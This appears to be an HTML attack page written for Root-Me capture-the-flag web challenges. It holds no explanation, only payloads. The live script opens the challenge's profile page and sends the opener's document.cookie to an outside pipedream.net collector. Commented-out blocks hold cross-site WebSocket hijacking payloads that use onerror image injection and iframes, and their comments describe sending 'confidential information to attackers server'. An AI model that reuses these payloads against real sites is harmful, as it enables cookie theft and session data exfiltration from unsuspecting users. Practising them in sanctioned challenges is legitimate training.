<!DOCTYPE html>

<body>

<script>


try{
	var aaa = open('http://challenge01.root-me.org:58003/profile', 'target')
	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + aaa.opener.document.cookie, {mode: 'no-cors'})
	/*
	window.opener.location.replace("http://challenge01.root-me.org:58003/profile");
	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + window.opener, {mode: 'no-cors'})
	*/
} catch (error) {
  	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr='+error, {mode: 'no-cors'})
}
</script>
<!--
<script>
	var aaa = open('http://challenge01.root-me.org:58003/profile', 'target')

	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + window.opener, {mode: 'no-cors'})
</script>
-->
</body>
<!--
<form method="post" id='aaa' action="http://challenge01.root-me.org:58005/?style=https://rootmetoot.github.io/myfile">
                                <p>
                                        If you find any bug on my super website, feel free to report it using this form.<br />
                                        Fill url field with the url of my website where you found the bug.
                                </p>
				
                                <p style="color: darkgreen; background: white; padding: 1em; border-radius: 0.1em;">
					
                                        Thanks for your feedback, I will check as soon as possible.
					
                                </p>
				
                                <input name="name" type="text" placeholder="Name" />
                                <input name="email" type="text" placeholder="E-Mail" />
                                <input name="url" type="text" placeholder="URL" />
                                <textarea name="description" placeholder="Description of the bug..."></textarea>
				<input type="text" name="csrf" value="ruW-tjL1BWCdhbiOCA7=VEsDrT52Hf@gZ" class="csrf" />
                                <input type="submit" value="Report a bug" >
                        </form>

-->

<!--
<meta http-equiv="Content-Security-Policy" content="default-src * data: mediastream: blob: filesystem: about: ws: wss: 'unsafe-eval' 'wasm-unsafe-eval' 'unsafe-inline'; connect-src * data: blob: 'unsafe-inline';">
<META HTTP-EQUIV="Access-Control-Allow-Origin" CONTENT="http://ctf21.root-me.org/room">

<body>

	<img src="https://en6gc9c8vfzvo.x.pipedream.net?firstImage">
	<img src=x onerror="var ws = new WebSocket('ws://ctf21.root-me.org/ws');
		ws.onopen = start
		ws.onmessage = handleReply
		ws.on('connection', function(ws, req) {
		  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?thi_head='+req.headers, {mode: 'no-cors'})
		});
		function start(event) {
		  ws.send('hello'); //Send the message to retreive confidential information
		}
		function handleReply(event) {
		  //Exfiltrate the confidential information to attackers server
		  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?thi='+event.data, {mode: 'no-cors'})
		
	}">

	<script type="text/javascript">
		var iframe = document.createElement('iframe');
		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?if1', {mode: 'no-cors'})
        iframe.src = 'http://ctf21.root-me.org/room';
        iframe.height = '80%';
        iframe.width = '80%';
        iframe.onload = function() {
        	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?if2', {mode: 'no-cors'})
        	try {
        		const event = new KeyboardEvent('keydown', {
				  key: 'Enter',
				  code: 'Enter',
				  which: 13,
				  keyCode: 13,
				});

			  	iframe.contentWindow.document.getElementById('input').value='hello';
	            iframe.contentWindow.document.getElementById('input').dispatchEvent(event);
	            fetch('https://en6gc9c8vfzvo.x.pipedream.net/?if3', {mode: 'no-cors'})
	            
            } catch (error) {
			  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?errifr='+error, {mode: 'no-cors'})
			}
        	/*
        	var ws = new WebSocket('ws://ctf21.root-me.org/ws');
			ws.onopen = start
			ws.onmessage = handleReply
			function start(event) {
			  ws.send('hello'); //Send the message to retreive confidential information
			}
			function handleReply(event) {
			  //Exfiltrate the confidential information to attackers server
			  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?cba='+event.data, {mode: 'no-cors'})
			}
			*/
        };
        fetch('https://en6gc9c8vfzvo.x.pipedream.net/?if4', {mode: 'no-cors'})
        document.getElementsByTagName('body')[0].appendChild(iframe);
        fetch('https://en6gc9c8vfzvo.x.pipedream.net/?if5', {mode: 'no-cors'})
	</script>
	
	
	<script>
		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?1', {mode: 'no-cors'})
		try {
		  	var ws = new WebSocket('ws://ctf21.root-me.org/ws');
			fetch('https://en6gc9c8vfzvo.x.pipedream.net/?2', {mode: 'no-cors'})
			ws.onopen = start
			ws.onmessage = handleReply
			function start(event) {
			  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?3', {mode: 'no-cors'})
			  ws.send('hello'); //Send the message to retreive confidential information
			}
			function handleReply(event) {
			  //Exfiltrate the confidential information to attackers server
			  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
			}
		} catch (error) {
		  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?err='+error, {mode: 'no-cors'})
		}

		
	</script>
	
</body>
-->
<!--

<!DOCTYPE html>


<meta http-equiv="Content-Security-Policy" content="*">
<meta http-equiv="Access-Control-Allow-Origin" content="*">

<meta http-equiv="Content-Security-Policy" content="default-src * data: mediastream: blob: filesystem: about: ws: wss: 'unsafe-eval' 'wasm-unsafe-eval' 'unsafe-inline'; connect-src * data: blob: 'unsafe-inline';">
<META HTTP-EQUIV="Access-Control-Allow-Origin" CONTENT="http://ctf20.root-me.org/room">
<p id="para"></p></body>
        <script>
        var iframe = document.createElement('iframe');
        iframe.src = 'http://ctf20.root-me.org/room';
        iframe.height = '80%';
        iframe.width = '80%';
        //iframe.onload = actions;
        document.getElementsByTagName('body')[0].appendChild(iframe);
        const event = new KeyboardEvent('keydown', {
			  key: 'Enter',
			  code: 'Enter',
			  which: 13,
			  keyCode: 13,
			});
        var ws = new WebSocket('ws://ctf20.root-me.org/ws');
	ws.onopen = start
	ws.onmessage = handleReply
	function start(event) {
	  ws.send('hello'); //Send the message to retreive confidential information
	}
	function handleReply(event) {
	  //Exfiltrate the confidential information to attackers server
	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
	}
        //document.getElementById('input').value='hello';
	    //document.getElementById('input').dispatchEvent(event);

        function sleep(ms) {
		    return new Promise(resolve => setTimeout(resolve, ms));
		}
        function actions(){
            
            const event = new KeyboardEvent('keydown', {
			  key: 'Enter',
			  code: 'Enter',
			  which: 13,
			  keyCode: 13,
			});

            
			aa(event)
        }
        function aa(event){
            var ff = false
            do {
            	try {
			  	document.getElementById('input').value='hello';
	            document.getElementById('input').dispatchEvent(event);
	            ff = true
	            
	            } catch (error) {
				  console.error(error);
				  // Expected output: ReferenceError: nonExistentFunction is not defined
				  // (Note: the exact output may be browser-dependent)
				  sleep(2000)
				}
			} while (!ff);
        }
        

        </script>

<img src="https://en6gc9c8vfzvo.x.pipedream.net?firstImage">
<img src=x onerror="var ws = new WebSocket('ws://ctf20.root-me.org/ws');
	ws.onopen = start
	ws.onmessage = handleReply
	function start(event) {
	  ws.send('hello'); //Send the message to retreive confidential information
	}
	function handleReply(event) {
	  //Exfiltrate the confidential information to attackers server
	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
}">

<iframe src="http://ctf20.root-me.org/room" height="500" width="800" ></iframe>

<script>
/*
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function gogo() {
	var ws = new WebSocket('ws://ctf20.root-me.org/ws');
	ws.onopen = start
	ws.onmessage = handleReply
	function start(event) {
	  ws.send('hello'); //Send the message to retreive confidential information
	}
	function handleReply(event) {
	  //Exfiltrate the confidential information to attackers server
	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
	}
	//sleep(10000)
	//conn.onopen = () => conn.send("Message");
	//ws.send(`hello`);
}
*/

var errors = "";
window.onerror = function(error) {
  erros += error;
  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?erros='+ errors, {mode: 'no-cors'})
};
</script>